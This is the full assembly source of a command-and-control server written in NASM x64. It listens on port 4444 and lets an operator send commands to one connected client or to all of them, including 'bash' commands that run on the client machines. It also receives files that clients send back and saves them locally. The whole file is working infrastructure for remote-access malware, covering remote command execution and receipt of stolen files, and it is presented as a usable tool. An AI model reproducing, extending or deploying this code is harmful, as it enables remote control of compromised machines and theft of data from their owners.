;------------------------------
; server.asm - C2 server in NASM x64

;------------------------------
; It can send commands to either one specific client or every client
; to send to specific, add <fd>: before the command
; for exemple you'll send 4:PING to send a ping only to client with file descriptor 4
; if you don't specify a client, it will send to every connected clients
; possible commands are : PING (answer PONG from client) and bash [BASH COMMAND]
; Still as an exemple : 6:bash ls
; will display in server cli the result of ls on client with file descriptor 6.
; Now also handles COPY command from the client, will output the text to "recv_" file.
;------------------------------
global _start

%define MAX_POLLFD    20      ; maximum number of entries in the pollfds array

; sockaddr_in structure (16 bytes in size)
section .data
    server_addr:
       dw 2             ; sin_family = AF_INET
       dw 0x5c11        ; sin_port = 4444 (port in network order: 0x115c → 0x5c11 in little-endian)
       dd 0x0100007f    ; sin_addr = 127.0.0.1 (0x7F000001)
       times 8 db 0     ; sin_zero[8]
    server_addr_len equ 16

    newline_str         db 10, 0
    client_msg_prefix   db "From client ", 0
    client_msg_suffix   db ": ", 10
    server_msg_prefix   db "", 0
    connected_clients_msg db "Connected clients: ", 0
    space               db " ", 0

    recv_prefix_str     db "recv_", 0

section .bss
    ; Each pollfd entry is 8 bytes:
    ;   [0..3]  fd (int, 32 bits)
    ;   [4..5]  events (short, 16 bits)
    ;   [6..7]  revents (short, 16 bits)
    pollfds resb MAX_POLLFD*8
    buf     resb 1024       ; message buffer

    copy_out_buf resb 256   ; buffer for the output filename

section .text

_start:
    ; 1. Create the server socket: socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 41         ; sys_socket
    mov rdi, 2          ; AF_INET
    mov rsi, 1          ; SOCK_STREAM
    mov rdx, 0          ; protocol 0
    syscall
    ; rax now holds the file descriptor of the server socket
    mov r12, rax        ; r12 = server socket FD

    ; 2. Bind to 127.0.0.1:4444
    mov rdi, r12
    lea rsi, [rel server_addr]
    mov rdx, server_addr_len
    mov rax, 49         ; sys_bind
    syscall

    ; 3. Listen (backlog = 10)
    mov rdi, r12
    mov rsi, 10
    mov rax, 50         ; sys_listen
    syscall

    ; 4. Initialize the pollfds array
    ; Use pollfds[0] for the server socket, pollfds[1] for STDIN (fd 0)
    mov rdi, pollfds
    mov rcx, MAX_POLLFD*8
    xor rax, rax
    rep stosb

    ; pollfds[0] = { fd = server, events = POLLIN (1) }
    mov dword [pollfds], r12d
    mov word  [pollfds + 4], 1

    ; pollfds[1] = { fd = STDIN (0), events = POLLIN (1) }
    mov dword [pollfds+8], 0
    mov word  [pollfds+8+4], 1

    mov r13, 2         ; nfds = 2 (two active entries)

server_loop:
    ; Call poll(pollfds, nfds, timeout = -1)
    lea rdi, [pollfds]
    mov rsi, r13
    mov rdx, -1
    mov rax, 7         ; sys_poll
    syscall
    cmp rax, 0
    jl server_exit

    xor r14, r14     ; r14 will be used as an index in pollfds

.poll_loop:
    cmp r14, r13
    jge .after_poll_loop

    mov rcx, r14
    shl rcx, 3         ; rcx = r14 * 8 (size of one pollfd entry)
    lea rbx, [pollfds + rcx]
    movzx rax, word [rbx + 6]   ; retrieve revents field
    test rax, rax
    jz .next_poll_fd

    ; If there is an event on pollfds[i]
    cmp r14, 0
    je .handle_server_socket    ; i == 0 → new connection
    cmp r14, 1
    je .handle_stdin_server     ; i == 1 → STDIN
    jmp .handle_client          ; otherwise, message from a client

.next_poll_fd:
    inc r14
    jmp .poll_loop

.after_poll_loop:
    jmp server_loop

; -----------------------------------------------
.handle_server_socket:
    ; Accept a new client
    mov rdi, r12         ; server socket FD
    xor rsi, rsi         ; NULL address
    xor rdx, rdx         ; NULL addrlen
    mov rax, 43          ; sys_accept
    syscall
    cmp rax, 0
    jl .clear_revents_and_next
    ; Add the client in pollfds[r13]
    mov rcx, r13
    shl rcx, 3
    lea r8, [pollfds + rcx]
    mov dword [r8], eax  ; store the client's FD (32 bits)
    mov word [r8 + 4], 1 ; events = POLLIN
    inc r13

    ; Display the list of connected clients (starting at index 2)
    lea rdi, [rel connected_clients_msg]
    call print_string
    mov r15, 2
.print_clients_loop:
    cmp r15, r13
    jge .done_print_clients
    mov rcx, r15
    shl rcx, 3
    lea rbx, [pollfds + rcx]
    mov edi, dword [rbx]
    call print_decimal
    lea rdi, [rel space]
    call print_string
    inc r15
    jmp .print_clients_loop
.done_print_clients:
    lea rdi, [rel newline_str]
    call print_string
    jmp .clear_revents_and_next

; -----------------------------------------------
.handle_stdin_server:
    ; Read from STDIN into buf (message to send)
    mov rdi, 0           ; fd = STDIN
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0           ; sys_read
    syscall
    cmp rax, 0
    jle .clear_revents_and_next
    mov rbx, rax         ; rbx = number of bytes read

    ; --- Check the format for targeted sending ---
    lea rsi, [buf]       ; rsi points to the start of buf
    mov al, byte [rsi]
    cmp al, '0'
    jb .broadcast_message
    cmp al, '9'
    ja .broadcast_message

    ; Parse the target fd number before the ':' character
    xor r8d, r8d         ; r8d will hold the target fd
.parse_fd_loop:
    mov al, byte [rsi]
    cmp al, ':'
    je .found_colon
    cmp al, '0'
    jb .broadcast_message
    cmp al, '9'
    ja .broadcast_message
    imul r8d, r8d, 10    ; r8d = r8d * 10
    movzx eax, byte [rsi]
    sub eax, '0'
    add r8d, eax
    inc rsi
    jmp .parse_fd_loop

.found_colon:
    inc rsi              ; skip ':'; rsi points to the start of the message
    lea r10, [buf]
    mov r11, rsi
    sub r11, r10         ; r11 = number of bytes consumed for the fd and ':'
    mov rdx, rbx
    sub rdx, r11

    ; Search for the client whose fd matches r8d (starting at index 2)
    mov r15, 2
.find_client:
    cmp r15, r13
    jge .client_not_found
    mov rcx, r15
    shl rcx, 3
    lea rdi, [pollfds + rcx]
    mov eax, dword [rdi]   ; stored client FD (32 bits)
    cmp eax, r8d
    je .send_to_target
    inc r15
    jmp .find_client

.client_not_found:
    jmp .clear_revents_and_next

.send_to_target:
    ; Send to the targeted client
    mov rdi, rax         ; FD of the found client
    mov rax, 1           ; sys_write
    syscall
    jmp .clear_revents_and_next

.broadcast_message:
    ; Broadcast to all clients (indices ≥ 2)
    lea rsi, [buf]
    mov rdx, rbx
    mov r15, 2
.broadcast_loop:
    cmp r15, r13
    jge .done_broadcast
    mov rcx, r15
    shl rcx, 3
    lea r8, [pollfds + rcx]
    mov eax, dword [r8]
    mov rdi, rax
    lea rsi, [buf]
    mov rdx, rbx
    mov rax, 1
    syscall
    inc r15
    jmp .broadcast_loop
.done_broadcast:
    jmp .clear_revents_and_next

; -----------------------------------------------
; -----------------------------------------------
.handle_client:
    ; Read the complete message from a client (pollfds[i] for i >= 2)
    mov rcx, r14
    shl rcx, 3               ; rcx = r14 * 8 (pollfd entry size)
    lea rbx, [pollfds + rcx]
    mov edi, dword [rbx]     ; retrieve the client's FD
    mov r15, rdi             ; store client FD for COPY usage

    ; Block read (up to 1024 bytes) from the client
    mov rdi, rdi             ; client FD
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0               ; sys_read
    syscall
    cmp rax, 0
    jle .client_disconnect
    mov r8, rax              ; r8 = number of bytes read

    ; Check if this is the start of a COPY header
    ; "COPY HEADER: <filename>\n"
    ; Minimal length is about 13+ bytes ("COPY HEADER: ")
    cmp r8, 13
    jb .normal_message
    mov eax, dword [buf]
    cmp eax, 0x59504F43     ; "COPY"
    jne .normal_message
    cmp byte [buf+4], 0x20
    jne .normal_message
    ; Then check "HEADER:"
    mov eax, dword [buf+5]
    cmp eax, 0x44414548     ; "HEAD"
    jne .normal_message
    cmp byte [buf+9], 0x45  ; 'E'
    jne .normal_message
    cmp byte [buf+10],0x52  ; 'R'
    jne .normal_message
    cmp byte [buf+11],0x3A  ; ':'
    jne .normal_message

    ; If recognized as COPY HEADER, handle file reception
    call handle_copy_receive
    jmp .clear_revents_and_next

.normal_message:
    ; Print header once: "From client <fd>: "
    lea rdi, [rel client_msg_prefix]
    call print_string
    mov edi, dword [rbx]     ; reuse the client FD for printing
    call print_decimal
    lea rdi, [rel client_msg_suffix]
    call print_string

    ; Print the full message received
    mov rdi, 1               ; STDOUT
    lea rsi, [buf]
    mov rdx, r8              ; number of bytes read
    mov rax, 1               ; sys_write
    syscall

    ; Print a final newline
    lea rdi, [rel newline_str]
    call print_string

    jmp .clear_revents_and_next

.client_disconnect:
    ; If read returns 0, the client closed the connection
    mov rcx, r14
    shl rcx, 3
    lea rbx, [pollfds + rcx]
    mov edi, dword [rbx]
    mov rax, 3           ; sys_close
    syscall
    dec r13              ; decrement nfds
    cmp r14, r13
    je .clear_revents_and_next
    mov rcx, r13
    shl rcx, 3
    lea rdx, [pollfds + rcx]
    mov rcx, r14
    shl rcx, 3
    lea rsi, [pollfds + rcx]
    mov eax, dword [rdx]
    mov dword [rsi], eax

.clear_revents_and_next:
    mov rcx, r14
    shl rcx, 3
    lea rbx, [pollfds + rcx]
    mov word [rbx + 6], 0
    inc r14
    jmp .poll_loop

server_exit:
    mov rdi, 0
    mov rax, 60
    syscall

; ------------------------------------------------
; Subroutine: print_string
; Prints the NUL-terminated string pointed to by rdi to STDOUT
print_string:
    push rdi
    mov rsi, rdi
    xor rcx, rcx
.find_len:
    cmp byte [rsi+rcx], 0
    je .found_len
    inc rcx
    jmp .find_len
.found_len:
    mov rdx, rcx
    mov rdi, 1      ; STDOUT
    mov rax, 1      ; sys_write
    syscall
    pop rdi
    ret

; ------------------------------------------------
; Subroutine: print_decimal
; Prints the 32-bit number in rdi as a decimal on STDOUT
print_decimal:
    push rbp
    mov rbp, rsp
    sub rsp, 32         ; space for the temporary string
    mov rax, rdi
    cmp rax, 0
    jne .convert_loop
    mov byte [rsp], '0'
    mov rcx, 1
    jmp .print_dec
.convert_loop:
    xor rcx, rcx
.conv_loop:
    mov rdx, 0
    mov rbx, 10
    div rbx
    add rdx, '0'
    mov byte [rsp+rcx], dl
    inc rcx
    cmp rax, 0
    jne .conv_loop
.print_dec:
    mov rbx, rcx
.print_dec_loop:
    cmp rbx, 0
    je .done_print_dec
    dec rbx
    mov al, [rsp+rbx]
    mov rdi, 1
    lea rsi, [rsp+rbx]
    mov rdx, 1
    mov rax, 1
    syscall
    jmp .print_dec_loop
.done_print_dec:
    add rsp, 32
    pop rbp
    ret

; ------------------------------------------------
; Subroutine: copy_string
; Copies the null-terminated string from RSI to RDI.
; On return, RDI points to the end of the copied string.
copy_string:
    push rsi
.copy_loop:
    lodsb
    stosb
    cmp al, 0
    jne .copy_loop
    pop rsi
    ret

; ------------------------------------------------
; COPY COMMAND SECTION
; The client sends:
;   "COPY HEADER: <filename>\n"
;   [file data... possibly in multiple chunks]
;   "COPY FOOTER: <filename>\n"
; This function receives the header, opens "recv_", then reads chunks
; until the substring "COPY FOOTER:" is found. Only bytes before that footer are written.
handle_copy_receive:
    ; The header is "COPY HEADER: " => 12 bytes + at least 1 char for the filename
    ; We'll parse the filename starting at buf+12
    lea rsi, [buf+12]

    ; Remove any newline in the header line
    xor rcx, rcx
.copy_recv_remove_newline:
    mov al, [rsi+rcx]
    cmp al, 10
    je .copy_recv_found_newline
    test al, al
    jz .copy_recv_done_remove
    inc rcx
    jmp .copy_recv_remove_newline

.copy_recv_found_newline:
    mov byte [rsi+rcx], 0

.copy_recv_done_remove:
    ; Build "recv_<filename>"
    lea rdi, [copy_out_buf]
    mov rsi, recv_prefix_str
    call copy_string
    lea rsi, [buf+12]
    call copy_string

    ; Open output file in write mode (O_CREAT|O_WRONLY=65, mode=0644)
    mov rdi, -100
    lea rsi, [copy_out_buf]
    mov rdx, 65
    mov r10, 420
    mov rax, 257
    syscall
    cmp rax, 0
    jl .copy_recv_error
    mov rbx, rax

    ; Now read data until we detect "COPY FOOTER:"
.copy_recv_loop:
    mov rdi, r15   ; client FD
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0     ; sys_read
    syscall
    cmp rax, 0
    jle .copy_recv_finish

    ; Search for "COPY FOOTER:" inside this chunk
    ; If found, we only write the data before the footer
    ; Then stop receiving.
    push rax            ; save number of bytes read
    mov rdi, buf
    mov rsi, rax
    mov rdx, buf        ; we can reuse the buffer base
    call find_footer_substring
    ; On return, RCX = offset of footer or -1 if not found
    pop rax             ; restore number of bytes read in RAX

    cmp rcx, -1
    je .no_footer_found
    ; footer found at offset RCX, write only up to RCX
    mov rdx, rcx
    jle .write_nothing_if_neg  ; just in case

    mov rdi, rbx       ; file FD
    mov rsi, buf
    mov rax, 1         ; sys_write
    syscall
    jmp .copy_recv_finish

.write_nothing_if_neg:
    ; if rcx < 0, do nothing
    jmp .copy_recv_finish

.no_footer_found:
    ; write entire chunk
    mov rdi, rbx
    mov rsi, buf
    mov rdx, rax
    mov rax, 1
    syscall
    jmp .copy_recv_loop

.copy_recv_finish:
    ; close the file
    mov rdi, rbx
    mov rax, 3
    syscall
    ret

.copy_recv_error:
    ret

;------------------------------------------------
; find_footer_substring
; Input:
;   RDI = pointer to buffer
;   RSI = length of data read
;   RDX = base address of buffer (we can reuse RDX or not)
; Output:
;   RCX = offset of "COPY FOOTER:" if found, else -1
; This is a simple substring search for "COPY FOOTER:" in the chunk.
; If found, we return the offset of the substring start in RCX.
; If not found, RCX = -1.
find_footer_substring:
    push rbp
    mov rbp, rsp

    ; "COPY FOOTER:" is 12 bytes
    ; We'll do a naive search
    ; RDI = buffer start
    ; RSI = data length
    ; RDX = buffer base (not necessarily used, but we keep it as is)
    mov r8, rdi         ; keep pointer to buffer
    mov r9, rsi         ; keep length
    mov rcx, -1         ; default = not found

    cmp r9, 12
    jb .footer_not_found

    ; We'll loop from 0 to r9-12
    xor r10, r10        ; index
.search_loop:
    cmp r10, r9
    jge .footer_not_found
    ; check if we have at least 12 bytes from r10
    mov rax, r9
    sub rax, r10
    cmp rax, 12
    jb .footer_not_found

    ; compare 12 bytes to "COPY FOOTER:"
    ; "COPY FOOTER:" in little-endian is:
    ;  0x59504F43, 0x20524520, ...
    ; but simpler to compare char by char
    ; We'll do a small local loop
    push r10

    mov r11, 0
.compare_12:
    cmp r11, 12
    je .found_footer
    lea rax, [r10 + r11]
    mov al, [r8 + rax]
    cmp al, [footer_str + r11]
    jne .not_equal
    inc r11
    jmp .compare_12

.found_footer:
    ; r10 = index of substring
    mov rcx, r10        ; store offset in rcx
    pop r10
    jmp .end_search

.not_equal:
    pop r10
    inc r10
    jmp .search_loop

.footer_not_found:
    jmp .end_search

.end_search:
    mov rax, rcx
    mov rsp, rbp
    pop rbp
    ret

; The "COPY FOOTER:" literal for direct comparison:
section .rodata
footer_str db "COPY FOOTER:", 0